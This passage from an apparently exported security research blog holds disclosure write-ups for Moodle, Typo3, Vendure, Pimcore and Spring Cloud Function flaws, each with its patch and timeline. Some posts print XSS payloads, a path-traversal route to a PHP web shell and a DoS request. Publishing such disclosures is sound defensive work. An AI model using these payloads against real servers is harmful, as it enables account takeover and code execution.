page.\n\n<img src=\"/img/blogs/Moodle/image-5.webp\" style=\"width: 100%;\"/>\n\n9. The victim triggers the self-XSS payload in the context of the attacker's account. It creates a new frame in which the victim is authenticated back in their own account via OAuth. Both the parent document (attacker's session) and the frame (victim's session) share the same origin, so the payload has full access to everything inside the frame. \n\n<img src=\"/img/blogs/Moodle/image-6.webp\" style=\"width: 100%;\"/>\n\n10. From here, the attacker has full control over the victim's account. For example, using the following iframe’s onload event code will show an alert with the victim’s cookie: `alert('hijacked cookie:' + document.cookie);`. Any other action can be done directly in the frame on the victim's behalf. In case the victim account has admin privileges, code execution on the server can be achieved (as demonstrated in our [previous](https://www.sonarsource.com/blog/playing-dominos-with-moodles-security-1/) blog).\n\n\n# Patch\nThe vulnerability was [fixed](https://github.com/moodle/moodle/commit/3d3dd827fae6db06f8f2a265ef38cfd5566d0c17) in versions 4.2.2, 4.1.5, 4.0.10, 3.11.16, and 3.9.23 by removing the call to the `complete_user_login` function, causing the `confirm-linkedlogin.php` endpoint to not automatically login the user by clicking the link. \n\n```diff\n- if (!$user->suspended) {\n-         complete_user_login($user);\n-         \\core\\session\\manager::apply_concurrent_login_limit($user->id, session_id());\n\n+    if ($user->id == $USER->id) {\n//...\n```\n\nClicking a malicious link now will not log in to the attacker’s account and thus no self-XSS is executed on the victim (though stored self-XSS is still possible in the WYSIWYG editor).\n\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-03-22 | We report all issues to the vendor |\n| 2023-08-10 | Vendor patched the vulnerability |\n| 2023-08-21 | Vendor released security advisory and CVE-2023-40320 was assigned |\n\n# Summary\nIn this article, covering our second critical vulnerability found in Moodle, we demonstrated how attackers can leverage the self-XSS vulnerability to an impactful Account Takeover. Considering that, in addition to our first blog in the series covering another innocent initial bug to RCE, it is important to not overlook those innocuous issues. \n\nBy focusing on clean code practices, developers write software that is clear, maintainable, and understandable. These qualities make it easier to spot and address vulnerabilities during development, reducing the risk of introducing security flaws that could be exploited by attackers. It is important to address all security issues in order to reduce the chance of bug chains.\n\nWe would also like to thank Moodle again for their responsiveness and great communication.","tags":["moodle","ato","account take over","oauth"]},{"title":"Playing Dominos with Moodle's Security (1/2)","url":"/2023/08/21/Playing Dominos with Moodle's Security 1/","content":"# Introduction\nMoodle is an open-source learning management system (LMS) used to create and deliver online courses. It was first developed in 2002 by Martin Dougiamas and is now widely used by educators and institutions around the world, earning the trust of educational institutions worldwide, with its user base exceeding 350 million across 242 countries. \n\nMoodle provides a platform for teachers and trainers to create online courses and learning materials, manage course content, and interact with students through a range of communication tools such as discussion forums, messaging systems, and more.\n\nCompromising a Moodle instance could considerably impact schools and universities. From simple grade cheating to infiltrating internal networks, shutting down a whole university, and more. An attacker can potentially cause significant harm to an educational institution.\n\nThis is the first blog in a two-part series where we will present our findings on a Moodle security audit we conducted. We were drawn to researching the security aspect of the framework due to its popularity, with the goal of contributing to a safer internet.\n\nIn this first article, we demonstrate how an unauthenticated attacker can leverage a vulnerability with a supposedly low impact to gain full control over the Moodle instance.\n\n# Impact\nMoodle versions 4.1.x before 4.1.3 and 4.2.x before 4.2.0 are susceptible to an unauthenticated arbitrary folder creation, tracked as CVE-2023-30943. An attacker can leverage the creation of arbitrary folders to carry out a Stored Cross-Site Scripting (XSS) attack on the administration panel, resulting in arbitrary code execution on the server as soon as an administrator visits the panel.\n\n<iframe width=\"100%\" height=\"414\" src=\"https://www.youtube.com/embed/pevHGKKOsqU\" title=\"Demonstration of Moodle vulnerabilities (CVE-2023-30943) on a test instance\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section, we discuss the origin of the vulnerability and how an attacker can turn an arbitrary folder creation into a Stored Cross-Site Scripting vulnerability and then execute arbitrary commands.\n\n## Background\nLike many other applications, Moodle has its own permission/authorization levels, using roles such as students, teachers, managers, etc. An administrator account can install arbitrary plugins (PHP code). This feature allows an administrator to execute code on the server by design.\n\nBy default, the register feature is disabled on Moodle: this is mainly because schools usually don't want random people to register and login into their Moodle, but only their students. For example, only after a student is accepted by a university, they will manually create a Moodle user and provide the student with their login credentials. \n\n# From arbitrary folder creation to RCE (CVE-2023-30943)\nAlthough the attack surface for an unauthenticated attacker is minimal, we found two interesting endpoints that do not require authentication.\n\nBoth of the following endpoints take a `RAW` typed input from the `rev` parameter and generate a custom path that includes the provided `rev` parameter in the middle. Later, a folder will be created on this path if it doesn't exist. Since the parameter type is `RAW` (no modification or sanitization by Moodle) and its value is inserted in the middle of the path string, an attacker can create arbitrary folders on the server by using path traversal sequences. Without control over any files (names, paths, nor data) the impact of this weird bug is questionable at first glance. \n\n* lib/editor/tiny/lang.php\n```php\n$rev  = min_optional_param('rev', 0, 'RAW');\n$lang = min_optional_param('lang', 'standard', 'SAFEDIR');\n//...\n$this->candidatefile = \"{$CFG->localcachedir}/editor_tiny/{$this->rev}/lang/{$this->lang}/lang.json\";\n//...\n@mkdir(dirname($this->candidatefile), $CFG->directorypermissions, true);\n//...\n```\n* lib/editor/tiny/loader.php\n```php\n$this->rev  = min_optional_param('rev', 0, 'RAW');\n$this->filepath = min_optional_param('filepath', 'standard', 'SAFEPATH');\n//...\n$this->candidatefile = \"{$CFG->localcachedir}/editor_tiny/{$this->rev}/{$filepathhash}\";\n//...\n@mkdir(dirname($this->candidatefile), $CFG->directorypermissions, true);\n//...\n```\n\nIn order to determine ways, how this could be exploited, we can assume that any folder name on the server is equivalent to an attacker’s input. From here we can go over all PHP code, that interacts with folders/files and consider them as sources. \n\nSome of the PHP functions, which should be considered for example:\n* glob\n* *dir (scandir/opendir/readdir/closedir)\n* realpath\n* …\n\nUsing this approach, we encountered an interesting code flow. When an admin visits the site administration page the following code is executed:\n\n`lib/adminlib.php`\n```php\n       foreach (glob($CFG->dirroot.'/'.$CFG->admin.'/settings/*.php') as $file) {\n           if ($file == $CFG->dirroot.'/'.$CFG->admin.'/settings/top.php') {\n               continue;\n           }\n           if ($file == $CFG->dirroot.'/'.$CFG->admin.'/settings/plugins.php') {\n           // plugins are loaded last - they may insert pages anywhere\n               continue;\n           }\n           require($file);\n       }\n```\nThe loop iterates over every file that ends with `.php` in the `admin/settings` and tries to `require` it. An attacker can simply add a folder that ends with `.php` at `/var/www/html/admin/settings/*.php` and crash all administration pages. \n\n<img src=\"/img/blogs/Moodle/image-1.webp\" style=\"width: 100%;\"/>\n\nThis attack on the admin panel is limited to a Denial of Service (DoS), but we were curious, if attackers may even gain RCE.\n\n## XSS from arbitrary folder creation\nMoodle offers methods for teachers and students to share learning materials and submissions, which could be in the form of files like word-processed documents or slideshow presentations. By default, Moodle supports a number of file types. An administrator can [add](https://docs.moodle.org/402/en/Working_with_files#Adding_a_new_file_type) other file types to their Moodle instance. Doing so requires choosing a corresponding icon that will represent the file type. \n\n\nThe code at `admin/tool/filetypes/classes/utils.php` lists the available icons by iterating over the files (**including folders**) that end with `.svg`/`.gif`/`.png` in a dedicated path: \n\n```php\npublic static function get_icons_from_path($path) {\n        $icons = array();\n        if ($handle = @opendir($path)) {\n            while (($file = readdir($handle)) !== false) {\n                $matches = array();\n                if (preg_match('~(.+?)(?:-24|-32|-48|-64|-72|-80|-96|-128|-256)?\\.(?:svg|gif|png)$~',\n                        $file, $matches)) {\n                    $key = $matches[1];\n                    $icons[$key] = $key;\n                }\n            }\n            closedir($handle);\n        }\n        ksort($icons);\n        return $icons;\n    }\n```\n\nThe name of the files/folders are displayed on the page without sanitization (`admin/tool/filetypes/edit_form.php`):\n\n```php\n$fileicons = \\tool_filetypes\\utils::get_file_icons();\n$mform->addElement('select', 'icon', get_string('icon', 'tool_filetypes'), $fileicons);\n```\n\nIn order to inject malicious JavaScript code, an attacker can create the following folder:\n`var/www/html/pix/f/<input><img src=x onerror=alert(1)>.png`\n\nWhen an admin tries to add a new filetype from the server settings page (http://moodle-domain/admin/tool/filetypes/edit.php?name=add), the folder name is reflected on the HTML page, and the JavaScript payload is executed in the context of the admin account.  Because the folder name is reflected inside a `select` tag the attacker needs an `input` tag first to [break out](https://html.spec.whatwg.org/#parsing-main-inselect), causing the `img` to render and JavaScript to run. This vulnerability can be exploited in a Cross-Site Scripting (XSS) attack against an admin user to achieve remote code execution on the server, as [demonstrated](https://cube01.io/blog/Moodle-DOM-Stored-XSS-to-RCE.html) before via plugin installation. \n\n[Plugins](https://docs.moodle.org/402/en/Installing_plugins) in Moodle are additional PHP code made to provide custom features and functionalities. Using Moodle’s web interface, admins can conveniently install user [shared](https://moodle.org/plugins/) plugins, or install their own from a local zip. Since plugins are simply PHP code, an attacker-controlled plugin is equivalent to arbitrary code execution.\n\nThere are probably other ways to exploit this vulnerability, but this XSS on the “new filetype” page demonstrates how an unauthenticated attacker can execute arbitrary code on the Moodle server by installing a malicious plugin.\n\n# Patch\nThe vulnerability was [fixed](https://github.com/moodle/moodle/commit/59d42e1ed23f916dcb47d53c745bef18a116d800) in versions 4.1.3 and 4.2.0 by casting the `$rev` parameter to integers in both files:\n```diff\n            [$rev, $lang] = explode('/', $slashargument, 2);\n-           $rev  = min_clean_param($rev, 'RAW');\n+           $rev  = min_clean_param($rev, 'INT');\n            $lang = min_clean_param($lang, 'SAFEDIR');\n        } else {\n-           $rev  = min_optional_param('rev', 0, 'RAW');\n+           $rev  = min_optional_param('rev', 0, 'INT');\n            $lang = min_optional_param('lang', 'standard', 'SAFEDIR');\n        }\n```\n```diff\n            [$rev, $filepath] = explode('/', $slashargument, 2);\n-           $this->rev  = min_clean_param($rev, 'RAW');\n+           $this->rev  = min_clean_param($rev, 'INT');\n            $this->filepath = min_clean_param($filepath, 'SAFEPATH');\n        } else {\n-           $this->rev  = min_optional_param('rev', 0, 'RAW');\n+           $this->rev  = min_optional_param('rev', 0, 'INT');\n            $this->filepath = min_optional_param('filepath', 'standard', 'SAFEPATH');\n        }\n```\n\nNow, an attacker cannot control the name of a folder nor traverse back directories in order to create arbitrary folders on the server.\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-03-22 | We report all issues to Vendor |\n| 2023-04-19 | Vendor patched the vulnerability |\n| 2023-05-01 | Vendor released security advisory and CVE-2023-30943 was assigned |\n# Summary\nIn this article, we showed how an unauthenticated actor could create an arbitrary folder on a Moodle server, an apparently innocuous action, to then trigger a Cross-Site Scripting vulnerability on the administration panel. With existing features of Moodle, this primitive can be turned into Remote Code Execution, ultimately granting an unauthenticated attacker arbitrary code execution on the server. \n\nIn the second article coming on August 29th, we will dive into how attackers could take over accounts by chaining minor vulnerabilities.\n\nWe would also like to thank Moodle for their responsiveness and great communication.","tags":["rce","moodle","unauthenticated","unauth"]},{"title":"Typo3 HTML Sanitizer By-passing via the noscript tag","url":"/2023/07/25/Typo3 HTML Sanitizer By-passing via the noscript tag/","content":"# Problem\nDue to an encoding issue in the serialization layer, malicious markup nested in a noscript element was not encoded correctly. noscript is disabled in the default configuration, but might have been enabled in custom scenarios. This allows bypassing the cross-site scripting mechanism of typo3/html-sanitizer.\n\n# Solution\nUpdate to `typo3/html-sanitizer` versions 1.5.1 or 2.1.2 that fix the problem described.\n\n# Credits\nThanks to David Klein and Yaniv Nizry who reported this issue, and to TYPO3 security team members Oliver Hader and Benjamin Franzke who fixed the issue.\n\n# References\n* [TYPO3-CORE-SA-2023-002](https://typo3.org/security/advisory/typo3-core-sa-2023-002)\n* [GHSA-59jf-3q9v-rh6g](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-59jf-3q9v-rh6g)\n* https://nvd.nist.gov/vuln/detail/CVE-2023-38500\n* [TYPO3/html-sanitizer@e3026f5](https://github.com/TYPO3/html-sanitizer/commit/e3026f589fef0be8c3574ee3f0a0bfbe33d7ebdb)\n* https://typo3.org/security/advisory/typo3-core-sa-2023-002\n","tags":["xss","mxss","bypass"]},{"title":"Vendure Cross Site Request Forgery vulnerability impacting all API requests","url":"/2023/07/11/Vendure Cross Site Request Forgery vulnerability impacting all API requests/","content":"## Impact\nVendure is an e-commerce GraphQL framework with a number of APIs and different levels of\nauthorization. By default the Cookie settings are insecure, having the SameSite setting as false\nwhich results in not having one (originates from the cookie-session npm package’s default\nsettings).\n\n# Patches\nUpdate to versions 2.0.3 or above.\n\n# Workarounds\nManually set the `authOptions.cookieOptions.sameSite` configuration option to `'strict'`, `'lax'` or `true`.\n\n# References\nAre there any links users can visit to find out more?\n* [GHSA-h9wq-xcqx-mqxm](https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-h9wq-xcqx-mqxm)\n* [vendure-ecommerce/vendure@4a10d67](https://github.com/vendure-ecommerce/vendure/commit/4a10d6785a3bf792ddf84053cdf232c205b82c81)","tags":["csrf","npm"]},{"title":"@vendure/admin-ui-plugin authenticated XSS","url":"/2023/07/03/Vendure admin-ui-plugin authenticated Cross-site Scripting/","content":"## Impact\nVendure provides an authorization system with different levels of privileges. For example, an administrator cannot create another administrator.\n\nIn the admin UI, there are a couple of places with description inputs, such as inventory/collection catalog, shipping methods, promotions, and more.\n\nWhile the WYSIWYG editor allows limited customization, altering the request data (not in the ui) saves and returns arbitrary HTML with no sanitization. Causing an XSS when viewing the page.\n\nThe impact of this XSS is privilege escalation. A user that can write any type of description can trigger the attack. Then any other user that visits the vulnerable page is prone to arbitrary Javascript code execution, giving the attacker ability to execute actions on behalf of this user.\n\n# Patches\nUpdate to versions 2.0.3 or above.\n\n# Workarounds\nIs there a way for users to fix or remediate the vulnerability without upgrading?\n\n# References\nAre there any links users can visit to find out more?\n* [GHSA-gm68-572p-q28r](https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-gm68-572p-q28r)\n* [vendure-ecommerce/vendure@0cdc92b](https://github.com/vendure-ecommerce/vendure/commit/0cdc92b241e6fd4017ddfc9fbdca189fc7c1ada0)\n* https://github.com/vendure-ecommerce/vendure/blob/master/CHANGELOG.md#203-2023-07-04","tags":["xss","npm"]},{"title":"Pimcore: One click, two security vulnerabilities","url":"/2023/05/15/Pimcore- One click, two security vulnerabilities/","content":"# Introduction\nThe Pimcore Platform provides software for central management of corporate data. With over 100,000 clients across 56 countries, including some major vendors, it has become a trusted choice for businesses worldwide. Available in both an Enterprise subscription as well as an Open Source Community Edition with a growing community of developers and users.\n\nWe make a consistent effort to enhance the technology powering our Clean Code solution by frequently scanning open-source projects and assessing the outcomes. In the case of Pimcore, our engine reported an interesting limited directory traversal vulnerability. After analyzing the finding we found an additional SQL Injection vulnerability in the same endpoint. Leveraging those two vulnerabilities, an admin that clicks on an attacker’s crafted link will execute arbitrary code on the server.\n\n# Pimcore Vulnerabilities Impact\nPimcore versions prior to 10.5.19 are susceptible to both a **path traversal** and an **SQL injection** vulnerability in the `create-csv` endpoint tracked as CVE-2023-28438. The two vulnerabilities can be exploited with a single GET request. Because of this, an attacker can create a malicious link, which can cause the **execution of arbitrary code** when accessed by an admin. \n\n<iframe width=\"100%\" height=\"414\" src=\"https://www.youtube.com/embed/7ODgHHyhuqg\" title=\"Demonstration of Pimcore vulnerabilities on a test instance\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section, we will discuss the technical details of the vulnerabilities and explain how an attacker could combine them to create a one-click exploit that will deploy a web shell on the server.\n\n## Limited Arbitrary File Write and Path Traversal\nScanning Pimcore with SonarCloud uncovered an interesting path traversal issue caused by passing user-controlled data as the filename parameter of `fopen`. You can inspect the finding directly on SonarCloud:\n\n[Try it by yourself on SonarCloud!](https://sonarcloud.io/project/issues?resolved=false&types=VULNERABILITY&id=SonarSourceResearch_pimcore-blogpost&open=AYbwBqEGzBX2hF8LIsrC&_gl=1*h7icnc*_gcl_au*OTE1ODQ0MTAxLjE2OTg1MTM1NzM.*_ga*MTIwOTcxMTcxNi4xNjk4NTEzNTcz*_ga_9JZ0GZ5TC6*MTY5ODU5NTQzMS4yLjEuMTY5ODU5NTQ3Ny4xNC4wLjA.)\n\nThe underlined feature is in the admin panel of Pimcore which enables the display of statistical reports on various aspects of the website. An admin can create custom reports, view them directly from the panel, or download the data in CSV format:\n\n<img src=\"/img/blogs/pimcore/image1.webp\" style=\"width: 100%;\"/>\n\nUpon further inspection of the vulnerable function `createCsvAction`, we found out that the user-controlled data is passed through the `admin/reports/custom-report/create-csv` endpoint’s `exportFile` parameter. Although this endpoint is only accessible by admins, it is a GET request endpoint with no CSRF protection, thus manipulating an admin to click on a link is enough.\n\nThe value of the `exportFile` parameter is appended to the web root path without prior sanitization, allowing an attacker to control the extension as well as traverse back in the folder path. \n\nOn continued inspection of the code, we can see that the user-controlled path will end up opening a file in “append” mode. Writing the `getData` function’s output to it using `fputcsv`:\n\n```php\npublic function createCsvAction(Request $request)\n   {\n       //...\n       $filters = $request->get('filter') ? json_decode(urldecode($request->get('filter')), true) : null;\n       $drillDownFilters = $request->get('drillDownFilters', null);\n       //...\n       $result = $adapter->getData($filters, $sort, $dir, $offset * $limit, $limit, $fields, $drillDownFilters);\n\n\n       if (!($exportFile = $request->get('exportFile'))) {\n           $exportFile = PIMCORE_SYSTEM_TEMP_DIRECTORY . '/report-export-' . uniqid() . '.csv';\n           @unlink($exportFile);\n       } else {\n           $exportFile = PIMCORE_SYSTEM_TEMP_DIRECTORY.'/'.$exportFile;\n       }\n\n\n       $fp = fopen($exportFile, 'a');\n\n\n       if ($includeHeaders) {\n           fputcsv($fp, $fields, ';');\n       }\n\n\n       foreach ($result['data'] as $row) {\n           $row = Service::escapeCsvRecord($row);\n           fputcsv($fp, array_values($row), ';');\n       }\n\n\n       //...\n   }\n```\n[File in Github](https://github.com/pimcore/pimcore/blob/928a964c13a5c9992cff4b5abdb25847529604d3/bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php#L422%C2%A0)\n\nUp until now, an attacker can control the CSV output file path, name, and extension. Although this allows the creation of PHP files on the server, an attacker will need to control the file content as well in order to execute arbitrary code. Here enters the second vulnerability, an SQL Injection in the `getData` function.\n\n## 1st SQL Injection sink\nLooking at the `createCsvAction` function from earlier, the inputs an attacker can control are `$drillDownFilters` and `$filters`, which are passed on to `getBaseQuery`:\n\n```php\n public function getData($filters, $sort, $dir, $offset, $limit, $fields = null, $drillDownFilters = null)\n   {\n       $db = Db::get();\n\n\n       $baseQuery = $this->getBaseQuery($filters, $fields, false, $drillDownFilters);\n       //...\n       if ($baseQuery) {\n           $total = $db->fetchOne($baseQuery['count']);\n           //...\n           $sql = $baseQuery['data'] . $order;\n           //...\n           $data = $db->fetchAllAssociative($sql);\n      //...\n   }\n```\n[File in Github](https://github.com/pimcore/pimcore/blob/v11.0.0-ALPHA5/bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php#L29)\n\nTwo SQL queries are issued with the result of the `getBaseQuery` function:\n\n1. `$baseQuery[‘count’]`: a query that returns the number of results using `COUNT(*)` will be used in `$db->fetchOne`.\n2. `$baseQuery[‘data’]`: will end up in `$db->fetchAllAssociative` and fetch the results.\n\nThis is how the `getBaseQuery` function that prepares those two queries looks like:\n```php\nprotected function getBaseQuery($filters, $fields, $ignoreSelectAndGroupBy = false, $drillDownFilters = null, $selectField = null)\n   {\n\t//...\n       $sql = $this->buildQueryString($this->config, $ignoreSelectAndGroupBy, $drillDownFilters, $selectField);\n       //...\n               foreach ($filters as $filter) {\n                   $operator = $filter['operator'];\n                   //..\n                   switch ($operator) {\n\t\t\t//..\n                       case '=':\n                           $fields[] = $filter['property'];\n                           $condition[] = $db->quoteIdentifier($filter['property']) . ' = ' . $db->quote($value);\n    \t\t//...\n           $total = 'SELECT COUNT(*) FROM (' . $sql . ') AS somerandxyz WHERE ' . $condition;\n           if ($fields && !$extractAllFields) {\n               $data = 'SELECT `' . implode('`,`', $fields) . '` FROM (' . $sql . ') AS somerandxyz WHERE ' . $condition;\n           }\n\t\t//...\n       return [\n           'data' => $data,\n           'count' => $total,\n       ];\n   }\n```\n[File in Github](https://github.com/pimcore/pimcore/blob/v11.0.0-ALPHA5/bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php#L150)\n\nAt first glance, we noticed an injection at the `$data` parameter, the SQL query's `SELECT` fields are not sanitized. The ```implode('`,`', $fields)``` can simply be escaped with backticks.\n\nIn order to control the `$fields` parameter we need to set the `$filters['operator']` attribute accordingly (in the code snippet only '=' is shown but there are other options) and then the `'property'` attribute will be appended to it. Immediately after a `$condition` string will be created. So in order to control the `$fields` value the `$condition` string will be present. \n\nHowever, while it seems like there is a simple SQL injection at `$data`, the `$condition` variable is concatenated to the end of both queries (`count` and `data`). And due to the quotation escaping (done using the functions `$db->quoteIdentifier` and `$db->quote`), any field containing a backtick character (`) will be doubled and thus making the query's syntax invalid.\n\nWe can of course comment out the rest of the query (using `--` or `;`) to avoid the syntax breaking `$condition`. But the `$total` query also has the broken `$condition`, and later be used in the line `$db->fetchOne($baseQuery['count'])` before fetching with the SQL Injected `data` query, thus raising an exception and not executing the SQL Injection.\n\n## 2nd SQL Injection sink\nSo we have an SQL Injection, but exploiting it will always cause a syntax error. Is there any other way to somehow ignore the `$condition` string?\n\nSome of you probably already noticed that before every `$condition` there is the `$sql` parameter, which is returned from `$this->getBaseQuery(...)`. If there is an SQL Injection in that function as well we can end the query before the syntax error.\n\n```php\nprotected function buildQueryString($config, $ignoreSelectAndGroupBy = false, $drillDownFilters = null, $selectField = null)\n   {\n       //...\n       if ($drillDownFilters) {\n           $havingParts = [];\n           $db = Db::get();\n           foreach ($drillDownFilters as $field => $value) {\n               if ($value !== '' && $value !== null) {\n                   $havingParts[] = \"$field = \" . $db->quote($value);\n               }\n           }\n\n\n           if ($havingParts) {\n               $sql .= ' HAVING ' . implode(' AND ', $havingParts);\n           }\n       }\n       return $sql;\n   }\n```\n\nAuditing the `buildQueryString` function we found another SQL Injection sink but now using the `$drillDownFilters` parameter. Though the value is being quoted, the field isn't. An attacker can use this sync to comment out the broken `$condition` and execute arbitrary SQL queries.\n\n# Exploitation - connecting everything together\nSo an attacker can control the output file and inject SQL to the function that fetches results which will end up in that file. Having the export file path pointing to a PHP file in the web root is straightforward using: \n\n```\n../../../../../../../../var/www/html/public/webshell.php\n```\n\nA PHP file will execute also if there is the PHP declaration randomly in the file, meaning a file doesn't have to start with `<?php`, so we don't have to worry about that. \n\nBut how can an attacker exploit the SQL Injection to result in arbitrary content?\n\nHaving multiple queries, one that inserts custom data and another that fetches it is possible but makes the exploit more complicated. Going back to our SQL query, the injection is in the SELECT fields, so we can use the [CASE expression](https://www.w3schools.com/sql/sql_case.asp).\n\nLastly, there are two parameters needed for the get request: \n\n* `headers=true` is to output the field names to the CSV\n* `name=Quality_Attributes` is a default name of a report from the demo app (in order to execute the vulnerable function the name has to be a valid report)\n\nCombining those 2 vulnerabilities from 3 sinks in 1 GET request an attacker could create a malicious link that will deploy a web shell on the server.\n\n# Patch\nBoth vulnerabilities were fixed in Pimcore version 10.5.19:\n\n* The SQL Injection was fixed by adding db->quoteIdentifier(...) in the field name as well.\n```php\n$havingParts[] = ($db->quoteIdentifier($field) .\" = \" . $db->quote($value));\n```\n* The path traversal was fixed by:\n\t* Verifying that the extension is “.csv”\n\t* Normalizing the path to prevent traversing \n```php\n$exportFileName = basename($exportFileName);\nif(!str_ends_with($exportFileName, \".csv\")) {\n      throw new InvalidArgumentException($exportFileName . \" is not a valid csv file.\");\n}\nreturn PIMCORE_SYSTEM_TEMP_DIRECTORY . '/' . $exportFileName;\n```\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023-02-20 | We reported all issues to Vendor |\n| 2023-03-15 | Vendor released patch version 10.5.19 |\n| 2023-03-22 | CVE-2023-28438 and [security advisory](https://github.com/pimcore/pimcore/security/advisories/GHSA-vf7q-g2pv-jxvx) released |\n\n# Summary\nThe focus of our blog post was on our success in identifying and utilizing two distinct vulnerabilities with a single GET request, ultimately leading to code execution. This serves as a powerful demonstration of our product's capability to detect security flaws, and we also highlighted the step-by-step process we followed from analyzing the results to creating a weaponized exploit.\n\nWe would like to thank the maintainers again for the quick response and for handling the situation professionally.","tags":["rce","php","sqli","path traversal"]},{"title":"Spring Function Cloud DoS (CVE-2022-22979) and Unintended Function Invocation","url":"/2022/06/26/Spring Function Cloud DoS (CVE-2022-22979) and Unintended Function Invocation/","content":"# Introduction\nThe Spring Framework application provides a flexible and comprehensive method for programming and configuring Java-based enterprise applications. One of the main purposes of Spring is to relieve developers from many infrastructural tasks so they can focus on writing application business logic.\n\nSpring consists of many projects and frameworks (that contain subprojects) where each one has its own objective and can be easily integrated into a larger Spring application. In our research, we focused\n\non the [Spring Cloud framework](https://spring.io/projects/spring-cloud) and specifically on the [Spring cloud function project](https://spring.io/projects/spring-cloud-function), which resulted in the findings of a denial of service (DoS) vulnerability and an unintended function invocation. The Cloud framework provides tools for developers to write their applications in a distribution environment, with technologies such as routing, load-balancing, circuit breakers, and more.\n\nThe function project opens an API (via a web endpoint, a stream processor, or a task) to run specific functions which fit a Spring Bean definition, reducing development overhead and boilerplate by mapping the function directly to a route.\n\n# Overview\nNow that we are familiar with the purpose of the project, let’s take a deep dive into the features and code functionality.\nThe web endpoint provides two methods to invoke functions:\n\n1. Via the URI ‘/functionRoute’, where the invoked bean function name is provided in one of the headers: spring.cloud.function.routing-expression / spring.cloud.function.definition.\n2. Or have the name of the function in the URI itself - for example http://host/function_name.\n\nBoth will end up invoking the same vulnerable function, but we will use the latter in the examples since it is simpler to demonstrate.\n\nAn interesting mechanism is in case the function input’s is an object. Spring will try to construct the object (only if it has a default/nullary constructor) and expose the setters to the user’s input. For instance, we have the function “isBigTree” which gets an object Tree that has a default/nullary constructor and a setter “setHeight”. We can call the function via POST to http://host/isBigTree using the payload {‘height’:50}, the function will receive a Tree object with the height = 50.\n\nIn addition, there is a feature that enables us to chain multiple functions which will be executed one after the other (and pass the output of one as an input to the next one) via the ‘,’ or ‘|’ char. For example, the URL http://host/function_a,function_b, will run function_a and pass its output as an input to function_b. \n\n\nSo, let’s say function_b receives an object without a default/nullary constructor, we couldn’t call it directly, but in case function_a’s output is the same object type we can chain those functions together.\n\n# Denial-of-Service (DoS) - Flooding The Function Router\n## Technical Details\nThe function name from the URL will end up in the [lookup](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L103) function which will try to determine and retrieve the function itself. The lookup function has a ‘cache’ mechanism that caches functions that have already been invoked in order to save time on subsequent lookups.\n\n<img src=\"/img/blogs/spring-function-cloud/Image-1.png\" style=\"width: 100%;\"/>\n\nThe check if the function is in the cache is done in the doLookup call ([line 114](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L114)). In case the function is null, indicating it is not in the cache, the process of retrieving the function is performed. After finding the function the [register](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L158) call will add the function to the cache ([line 148](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L148)).\n\nKnowing the feature discussed before, the splitting of functions via the characters ‘,’ or ‘|’ is done after the cache check and before the insertion of a new lookup result (the red square, [line 118](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L118)), which means that calling a function with ‘,’ or ‘|’ at the end will add it to the cache even if all chained functions are already in it. So, we can populate a list with endless permutations of known functions, all of whom will be added to the router. Flooding the router with XXX results will eventually slow down the server, resulting in significant delay and eventual timeouts, and will inevitably crash the application by exhausting memory.  Even with the spring-boot-starter-security dependency (which prevents unauthorized execution of bean functions), we can achieve denial-of-service since the verification of invocation permissions is only made after the lookup function.\n\n## Proof Of Concept\nUsing the sample code created by Spring, [function-sample-pojo](https://github.com/spring-cloud/spring-cloud-function/tree/v4.0.0-M2/spring-cloud-function-samples/function-sample-pojo), which has the following functions\n* Uppercase\n* Lowercase\n* Words\n(Note that for the PoC to work, we need to call a function that exists so it will register in the cache).\n```\nPOST  http://host/uppercase,\npayload: {‘a’:1}\n```\nAs you can see below, the cache increases in size over time and affects the response time accordingly (the functionRegistrations list is in the [register](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L158) function):\n\n<img src=\"/img/blogs/spring-function-cloud/Image-2.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-3.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-4.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-5.png\" style=\"width: 100%;\"/>\n\n## Mitigation\nUpdate Spring Cloud Function to 3.2.6 or above.\n\n# Unintended Function Invocations\n## Technical Details\nThis bug affects the same [lookup](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L103) function, which attempts to determine if the function itself should be executable as a bean function. In the [second line](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L108), the function name passes through the 